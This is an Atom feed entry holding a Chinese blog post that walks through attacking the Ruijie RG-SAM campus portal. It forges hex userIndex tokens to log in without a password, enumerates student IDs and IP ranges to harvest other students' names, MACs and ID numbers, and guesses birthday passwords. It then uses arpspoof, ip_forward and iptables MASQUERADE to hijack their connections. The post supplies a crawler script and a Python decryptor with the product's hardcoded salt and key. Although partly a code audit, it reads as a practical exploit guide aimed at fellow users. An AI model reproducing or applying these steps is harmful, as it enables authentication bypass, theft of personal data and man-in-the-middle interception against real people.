<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wxyのblog</title>
  
  
  <link href="https://wxy1343.xyz/atom.xml" rel="self"/>
  
  <link href="https://wxy1343.xyz/"/>
  <updated>2022-10-23T06:05:58.989Z</updated>
  <id>https://wxy1343.xyz/</id>
  
  <author>
    <name>wxy1343</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ruijie RG-SAM-Portal userIndex分析</title>
    <link href="https://wxy1343.xyz/2022/10/23/Ruijie-RG-SAM-Portal-userIndex%E5%88%86%E6%9E%90/"/>
    <id>https://wxy1343.xyz/2022/10/23/Ruijie-RG-SAM-Portal-userIndex%E5%88%86%E6%9E%90/</id>
    <published>2022-10-22T19:59:48.000Z</published>
    <updated>2022-10-23T06:05:58.989Z</updated>
    
    <content type="html"><![CDATA[<h1 id="userIndex分析"><a href="#userIndex分析" class="headerlink" title="userIndex分析"></a>userIndex分析</h1><h2 id="常规方法分析-对比法"><a href="#常规方法分析-对比法" class="headerlink" title="常规方法分析(对比法)"></a>常规方法分析(对比法)</h2><ul><li><p>对比</p><blockquote><p>首先找几个不同的账号的userIndex进行观察<br><code>64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e36362e36365f323130323230303031</code><br><code>64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e38382e38385f323030323230323032</code><br>经过对比可以发现前面都是相同的常量<br><code>64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e3</code><br>再对比下后面<br><code>6362e36365f323130323230303031</code><br><code>8382e38385f323030323230323032</code><br>可以发现重复项有2e还有5f，<br>还有很多3的组合，<br>把它们去掉来看看，<br><code>66 66 210220001</code><br><code>88 88 200220202</code><br>可以发现后面应该是账号，<br>前面的应该是ip地址后两位，<br>再次分析前面的常量，<br>去掉重复项<code>2e,5f,3</code>可以得到常量前缀<br><code>6462313261353765323838303535356234353466366138356439313431383139</code><br>后面的<code>31302e3130302e</code>就是<code>10 100</code><br>组合上之前的就是<br><code>10 100 66 66 210220001</code><br><code>10 100 88 88 200220202</code>  </p></blockquote></li><li><p>hex编码</p><blockquote><p>分析到这里已经很明显了，这就是个hex编码<br>使用python输入<code>bytes.fromhex(&#39;64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e38382e38385f323030323230323032&#39;)</code><br>就得到了<code>db12a57e2880555b454f6a85d9141819_10.100.88.88_200220202</code><br>前面这个<code>db12a57e2880555b454f6a85d9141819</code>暂时不知道，当作一个常量，之后分析源码时会讲到它的生成过程<br>所以userIndex是由固定前缀和学号还有ip组成的</p></blockquote></li><li><p>测试</p><blockquote><p>分析完成后就是测试一下能否使用它绕过用户登录<br>构造userIndex并访问这个url<br><code>http://172.172.255.20/eportal/success.jsp?userIndex=xxx</code><br>（注意这里的172.172.255.20有eportal的是门户系统，172.172.255.10:8080有selfservice就是sam系统，不同学校可能不一样）<br>可以发现可以不使用密码顺利登录了</p></blockquote></li></ul><span id="more"></span><h2 id="进阶分析"><a href="#进阶分析" class="headerlink" title="进阶分析"></a>进阶分析</h2><ul><li><p>前端api分析</p><blockquote><p>知道了userIndex的生成过程了,再分析一下它有什么用<br>打开抓包工具访问<code>http://172.172.255.20</code>分析一下请求,可以发现访问了一个接口用来获取用户信息<br><code>/eportal/InterFace.do?method=getOnlineUserInfo</code><br>post了一个参数正是userIndex,返回的是一个json,都是有关是个人信息的，但是有个前提用户必须在线<br>其中获取到的password如果不为空且不是加密的那么恭喜你，当然我们学校是空的，<br>但是selfUrl里面也有一个参数password,但也是加密的,同样后面代码审计时会分析如何解密<br>访问这个selfUrl,可以发现和success.jsp接口加userIndex一样是免登录的<br>所以有了这个接口还有账号+ip就可以获取任意用户信息了<br>接下来使用python生成userIndex<br><code>bytes.hex(&#39;_&#39;.join([&#39;之前获取的常量&#39;, ip, user_name]).encode())</code><br>然后爆破getOnlineUserInfo接口<br>为了节省爆破时间，我们需要找到一个能够判断用户名是否存在的api<br>很幸运通过分析前端代码可以找到很多有用的api<br>具体分析过程大概就是在源码中搜索关键词<br>比如<code>.js|.jsp|.jsf</code>等等<br>然后访问找到的链接再重复这些操作<br>这样很容易就能把前端所有暴露的接口找到<br>通过分析selfservice可以找到 <code>/selfservice/module/chargecardself/web/chargecardself_charge.jsf</code><br>访问后查看源码接着搜索<code>.jsf</code>可以找到<br><code>/selfservice/module/userself/web/userself_ajax.jsf?methodName=chargeCardListBean.checkUser</code><br>这个接口就是用来查询用户信息的<br>查看源码可以知道它是post了一个参数key，经过测试它的返回是json内容是<br><code>&#123;&#39;userId&#39;: &#39;xxx&#39;, &#39;userName&#39;: &#39;xxx&#39;, &#39;accountInfoUuid&#39;: &#39;xxx&#39;, &#39;userinfoUuid&#39;: &#39;xxx&#39;&#125;</code><br>如果找不到的话返回<br><code>该用户不存在</code><br>如果找不到接口的，我写了一个代码帮你找，只需要填入selfserive界面登录成功的JSESSIONID</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_url</span>(<span class="params">host, url, uri=<span class="string">&#x27;&#x27;</span>, depth=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> uri:</span><br><span class="line">        uri = url</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> uri <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> uri:</span><br><span class="line">        uri = url.rsplit(<span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>] + <span class="string">&#x27;/&#x27;</span> + uri</span><br><span class="line">    <span class="keyword">if</span> uri <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    s.add(uri)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * depth, uri)</span><br><span class="line">    r = requests.get(host + uri, cookies=&#123;<span class="string">&#x27;JSESSIONID&#x27;</span>: JSESSIONID&#125;,</span><br><span class="line">                     headers=&#123;<span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    r.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    result = re.findall(<span class="string">&#x27;[&quot;\&#x27;]([^&quot;\&#x27;]*\.js?[^&quot;\&#x27;&lt;&gt;()\s]*?)[&quot;\&#x27;]&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        check_url(host, url, i, depth + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Location&#x27;</span> <span class="keyword">in</span> r.headers:</span><br><span class="line">        location = r.headers[<span class="string">&#x27;Location&#x27;</span>]</span><br><span class="line">        check_url(host, url, location.split(host)[<span class="number">1</span>], depth + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSESSIONID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">check_url(<span class="string">&#x27;http://172.172.255.10:8080/&#x27;</span>, <span class="string">&#x27;/selfservice/module/webcontent/web/index_self.jsf&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>分析学号</p><blockquote><p>因为我们学校是已学号作为账号的，所以只需要分析学号生成规律就能爆破<br>首先举例一个我们学校的学号例如<code>210220001</code><br>经过分析可以得知前两位<code>21</code>是入学年份<br>紧接着两位<code>02</code>应该是哪个系，范围从<code>01</code>开始最大取到<code>99</code><br>紧接着两位<code>20</code>应该是哪个专业，同上<br>最后三位<code>001</code>就是序号，范围从<code>001</code>开始最大取到<code>999</code><br>按需分配，比如我们学校一个专业最多200人就取200，取多了废时间查询<br>然后写个脚本批量查询，把查到存在的学号保存起来待会爆破时可以用</p></blockquote></li><li><p>ip地址生成</p><blockquote><p>要生成userIndex还需要一个ip，我们学校分配的ip段是<code>10.100.0.0/16</code><br>我们要做的就是把这个段的所有ip拿去和账号生成userIndex，然后进行爆破<br>但是这样爆破的时间还是太久，但是我们学校的不同宿舍还有vlan划分，划分之后的ip段为<code>10.100.0.0/22</code>，也就是从每4个c段为一个子网，比如<code>10.100.64.0/22</code>就是<code>10.100.64.1~10.100.67.254</code>，这样先爆破我们当前宿舍的试试，一共ip个数是2^10也就是1024个</p></blockquote></li><li><p>开始爆破</p><blockquote><p>使用python异步来写脚本很快就把我们宿舍正在上网的用户爆破出来了，此时我们已经可以获取到每个用户的个人信息了，包括姓名ip和mac身份证等等信息，拿到这些信息后我们就可以进行爆破密码，我们学校设置的初始密码竟然是生日，有的学校是身份证后几位，校园网是http的还可以使用<code>arpspoof</code>后抓取密码</p></blockquote></li><li><p>共享上网</p><blockquote><p>有了密码之后就可以白嫖上网了，但是我们学校限制了重复登录，所以离白嫖还差一点点，经过我的研究可以通过<code>arpspoof</code>来实现共享上网，这里我使用kali，对目标mac发起<code>arpspoof</code>后可以发现对方现在已经把我认成网关了，但是发给我的数据包全被我丢了，此时只要开启一下ip转发就行<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; sysctl -p</code>，然后我们应该设置一下把我们接收到的包经过nat一下重新发回网关，不设置还是没法共享，怎么实现nat呢，linux有个<code>iptables</code>可以很方便实现<code>iptables -t nat -A POSTROUTING -j MASQUERADE</code>这个命令就是把所有要转发的包nat转换一下，也就是把mac和ip改成自己的，因为校园网是认mac的这样我们就相当于和他用了一个mac了，自然就可以共享网络了</p></blockquote></li></ul><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><ul><li><p>查找源码</p><blockquote><p>通过搜索引擎搜索<code>RG-SAM+</code>可以轻松找到源码下载地址<br><code>https://www.ruijie.com.cn/cp/yyxt-yygl/samx/</code><br><code>https://www.ruijie.com.cn/fw/rj/87101/</code><br>下载下来解压之后是个压缩包解压完可以找到两个exe<br>分别是<code>eportal</code>和<code>sam</code>的源码，这里我们分析eportal的<br>把exe改成zip再次解压就可以看到软件目录了<br>我们这里要找的是java服务端的源码<br>找不到的话可以使用wsl搜索<code>grep -rinal &#39;eportal&#39;</code><br>可以发现这个路径<code>jboss/server/default/deploy/eportal.war/</code>应该就是eportal的根目录了<br>分析可以知道服务端是jboss搭建的，使用的是tomcat容器，tomcat的配置文件位置是<code>WEB-INF\web.xml</code></p></blockquote></li><li><p>分析success.jsp</p><blockquote><p>这里我们看一下登录成功后的这个<code>/eportal/success.jsp?userIndex=</code>接口是怎么解析userIndex的  </p></blockquote><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> contentType=<span class="string">&quot;text/html; charset=GBK&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;com.ruijie.webportal.util.SuccessHelper&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;% SuccessHelper.pageProcess(request,response);</span><br><span class="line">out.clear();</span><br><span class="line">out = pageContext.pushBody(); </span><br><span class="line">%&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>打开<code>success.jsp</code>之后可以看到导入的类是<code>com.ruijie.webportal.util.SuccessHelper</code><br>然后调用了<code>SuccessHelper.pageProcess</code><br>这里我们用grep查找一下这个类在哪<br>经过查找可以找到<code>WEB-INF/classes/com/ruijie/webportal/util/SuccessHelper.class</code><br>这里我们把<code>WEB-INF/classes/</code>压缩一下，需要使用一个工具<code>jd-gui</code>，拖入其中，就可以看到java源码了<br>接下来打开对应的类名和方法进行分析<br>这里代码太长就放了一段</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pageProcess</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    MsgBean msgBean = (MsgBean)request.getSession().getAttribute(<span class="string">&quot;msgBean&quot;</span>);</span><br><span class="line">    UserBean userBean = (UserBean)request.getSession().getAttribute(<span class="string">&quot;userBean&quot;</span>);</span><br><span class="line">    String userIndex = request.getParameter(<span class="string">&quot;userIndex&quot;</span>);</span><br><span class="line">    String userip = request.getRemoteAddr();</span><br><span class="line">    <span class="keyword">if</span> (userBean != <span class="keyword">null</span>) &#123;</span><br><span class="line">      userBean.setMsgBean(msgBean);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (StringHelper.isNotEmpty(userIndex)) &#123;</span><br><span class="line">        userBean = UserHelper.getOnlineUserByUserIndex(userIndex);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        userBean = UserHelper.getOnlineUserByUserIp(request.getRemoteAddr());</span><br><span class="line">      &#125; </span><br><span class="line">      ...</span><br></pre></td></tr></table></figure><blockquote><p>我们只要盯着userIndex就行<br>可以看到调用了<code>UserHelper.getOnlineUserByUserIndex(userIndex);</code><br>继续跟踪  </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> UserBean <span class="title">getOnlineUserByUserIndex</span><span class="params">(String userIndex)</span> </span>&#123;</span><br><span class="line">    UserBean userBean = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (StringHelper.isEmptyString(userIndex))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>; </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        userIndex = <span class="keyword">new</span> String(StringHelper.hexStringToBytes(userIndex));</span><br><span class="line">        String[] indexArray = StringHelper.getMatcherStringArray(userIndex, <span class="string">&quot;([^_]*)_([^_]*)_(.*)&quot;</span>);</span><br><span class="line">        String webGateIp = indexArray[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (webGateIp.indexOf(<span class="string">&quot;.&quot;</span>) == -<span class="number">1</span>)</span><br><span class="line">        webGateIp = WebGateHelper.getWebGatebyMd5IP(webGateIp).getWebGateIp(); </span><br><span class="line">        userBean = (UserBean)UserDao.getInstance().findByUserIndex(webGateIp, indexArray[<span class="number">1</span>], indexArray[<span class="number">2</span>]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">        userBean = <span class="keyword">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> userBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里就调用了<code>StringHelper.hexStringToBytes(userIndex)</code>对应python代码的<code>bytes.fromhex(userIndex)</code></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hexStringToBytes(String hexStr) &#123;</span><br><span class="line">    <span class="keyword">return</span> hexStringToBytes(hexStr, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hexStringToBytes(String hexStr, String prefix) &#123;</span><br><span class="line">    <span class="keyword">if</span> (hexStr == <span class="keyword">null</span> || prefix == <span class="keyword">null</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(); </span><br><span class="line">    String myHexStr = hexStr.trim();</span><br><span class="line">    <span class="keyword">if</span> (myHexStr.startsWith(prefix))</span><br><span class="line">      myHexStr = myHexStr.substring(prefix.length()); </span><br><span class="line">    <span class="keyword">int</span> myHexStrLen = myHexStr.length();</span><br><span class="line">    <span class="keyword">byte</span>[] ba = <span class="keyword">new</span> <span class="keyword">byte</span>[myHexStrLen / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; myHexStrLen; i += <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> vi = Integer.parseInt(myHexStr.substring(i, i + <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> (vi &gt; <span class="number">128</span>)</span><br><span class="line">        vi -= <span class="number">256</span>; </span><br><span class="line">      ba[i / <span class="number">2</span>] = (<span class="keyword">byte</span>)vi;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> ba;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>算法我就不分析了，可以自己研究学习<br>hex解码后就和上面那个<code>db12a57e2880555b454f6a85d9141819_10.100.88.88_200220202</code>一样了</p></li></ul><h2 id="登录接口分析"><a href="#登录接口分析" class="headerlink" title="登录接口分析"></a>登录接口分析</h2><blockquote><p>之前userIndex中获取的<code>getOnlineUserInfo</code>接口获取的密码该如何解密呢<br>通过分析selfservice登录接口<code>/selfservice/module/scgroup/web/login_judge.jsf </code>可以得到答案<br>接下来搜索一下这个接口的源码<br>首先打开对应的文件目录查看一下<br><code>jboss\server\default\deploy\selfservice.war\module\scgroup</code><br>打开之后可以找到<code>scgroup</code>这个模块的源码在<code>lib</code>下的<code>scgroup.jar</code><br>接着拖入<code>jd-gui</code>分析<br>这里搜索方法名<code>login</code>查找一下登录接口<br>可以找到这个类<code>com.ruijie.spl.scgroup.web.LoginUserBean</code>  </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">login</span><span class="params">(HttpServletRequest request, String name, String password)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    HttpSession session = request.getSession();</span><br><span class="line">    ...</span><br><span class="line">    SecurityContext sc = scGroupService.login(name, password, request.getRemoteAddr());</span><br><span class="line">    session.setAttribute(<span class="string">&quot;SC&quot;</span>, sc);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (sc.getBaseUser() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        session.setAttribute(<span class="string">&quot;password&quot;</span>, SamJceForUser.decrypt(sc.getBaseUser().getPassword()));</span><br><span class="line">        session.setAttribute(<span class="string">&quot;userId&quot;</span>, sc.getBaseUser().getUserId());</span><br><span class="line">        ...</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>查看一下这个方法，可以发现参数有<code>HttpServletRequest</code>类，所以可以确定这个方法就是登录接口<br>跟踪参数<code>password</code>可以发现有一行调用了decrypt方法<br><code>session.setAttribute(&quot;password&quot;, SamJceForUser.decrypt(sc.getBaseUser().getPassword()));</code><br>继续跟踪这个类<code>com.ruijie.spl.common.crypt.SamJceForUser</code>，但这个类不在当前jar里，经过搜索这个类的文件在<code>selfservice.war\WEB-INF\lib\rgspl-common.jar</code>，拖入<code>jd-gui</code>就可以继续跟踪了<br>经过分析这个类就是用来加解密密码的<br>解密代码我已经转成python了，有兴趣的可以自己分析  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2022/3/26 2:24</span></span><br><span class="line"><span class="comment"># @Author  : wxy1343</span></span><br><span class="line"><span class="comment"># @File    : PBEWITHMD5andDES.py</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> des, CBC</span><br><span class="line"></span><br><span class="line">salt = <span class="string">b&#x27;\xc7\x73\x21\x8c\x7e\xc8\xee\x99&#x27;</span></span><br><span class="line">iterations = <span class="number">20</span></span><br><span class="line">password = <span class="string">&#x27;12&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_derived_key</span>():</span></span><br><span class="line">    m = md5()</span><br><span class="line">    m.update(password.encode())</span><br><span class="line">    m.update(salt)</span><br><span class="line">    result = m.digest()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, iterations):</span><br><span class="line">        m = md5()</span><br><span class="line">        m.update(result)</span><br><span class="line">        result = m.digest()</span><br><span class="line">    <span class="keyword">return</span> result[:<span class="number">8</span>], result[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    key, iv = get_derived_key()</span><br><span class="line">    padding = <span class="number">8</span> - <span class="built_in">len</span>(text) % <span class="number">8</span></span><br><span class="line">    text += <span class="built_in">chr</span>(padding).encode() * padding</span><br><span class="line">    encoder = des(key, CBC, iv)</span><br><span class="line">    encrypted = encoder.encrypt(text)</span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    key, iv = get_derived_key()</span><br><span class="line">    encrypted = <span class="built_in">bytes</span>.fromhex(text)</span><br><span class="line">    encoder = des(key, CBC, iv)</span><br><span class="line">    text = encoder.decrypt(encrypted)</span><br><span class="line">    padding = text[-<span class="number">1</span>]</span><br><span class="line">    text = text[:-padding]</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(encrypt(<span class="string">b&#x27;123456&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(decrypt(encrypt(<span class="string">b&#x27;123456&#x27;</span>)))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;userIndex分析&quot;&gt;&lt;a href=&quot;#userIndex分析&quot; class=&quot;headerlink&quot; title=&quot;userIndex分析&quot;&gt;&lt;/a&gt;userIndex分析&lt;/h1&gt;&lt;h2 id=&quot;常规方法分析-对比法&quot;&gt;&lt;a href=&quot;#常规方法分析-对比法&quot; class=&quot;headerlink&quot; title=&quot;常规方法分析(对比法)&quot;&gt;&lt;/a&gt;常规方法分析(对比法)&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;对比&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;首先找几个不同的账号的userIndex进行观察&lt;br&gt;&lt;code&gt;64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e36362e36365f323130323230303031&lt;/code&gt;&lt;br&gt;&lt;code&gt;64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e38382e38385f323030323230323032&lt;/code&gt;&lt;br&gt;经过对比可以发现前面都是相同的常量&lt;br&gt;&lt;code&gt;64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e3&lt;/code&gt;&lt;br&gt;再对比下后面&lt;br&gt;&lt;code&gt;6362e36365f323130323230303031&lt;/code&gt;&lt;br&gt;&lt;code&gt;8382e38385f323030323230323032&lt;/code&gt;&lt;br&gt;可以发现重复项有2e还有5f，&lt;br&gt;还有很多3的组合，&lt;br&gt;把它们去掉来看看，&lt;br&gt;&lt;code&gt;66 66 210220001&lt;/code&gt;&lt;br&gt;&lt;code&gt;88 88 200220202&lt;/code&gt;&lt;br&gt;可以发现后面应该是账号，&lt;br&gt;前面的应该是ip地址后两位，&lt;br&gt;再次分析前面的常量，&lt;br&gt;去掉重复项&lt;code&gt;2e,5f,3&lt;/code&gt;可以得到常量前缀&lt;br&gt;&lt;code&gt;6462313261353765323838303535356234353466366138356439313431383139&lt;/code&gt;&lt;br&gt;后面的&lt;code&gt;31302e3130302e&lt;/code&gt;就是&lt;code&gt;10 100&lt;/code&gt;&lt;br&gt;组合上之前的就是&lt;br&gt;&lt;code&gt;10 100 66 66 210220001&lt;/code&gt;&lt;br&gt;&lt;code&gt;10 100 88 88 200220202&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;hex编码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;分析到这里已经很明显了，这就是个hex编码&lt;br&gt;使用python输入&lt;code&gt;bytes.fromhex(&amp;#39;64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e38382e38385f323030323230323032&amp;#39;)&lt;/code&gt;&lt;br&gt;就得到了&lt;code&gt;db12a57e2880555b454f6a85d9141819_10.100.88.88_200220202&lt;/code&gt;&lt;br&gt;前面这个&lt;code&gt;db12a57e2880555b454f6a85d9141819&lt;/code&gt;暂时不知道，当作一个常量，之后分析源码时会讲到它的生成过程&lt;br&gt;所以userIndex是由固定前缀和学号还有ip组成的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;测试&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;分析完成后就是测试一下能否使用它绕过用户登录&lt;br&gt;构造userIndex并访问这个url&lt;br&gt;&lt;code&gt;http://172.172.255.20/eportal/success.jsp?userIndex=xxx&lt;/code&gt;&lt;br&gt;（注意这里的172.172.255.20有eportal的是门户系统，172.172.255.10:8080有selfservice就是sam系统，不同学校可能不一样）&lt;br&gt;可以发现可以不使用密码顺利登录了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
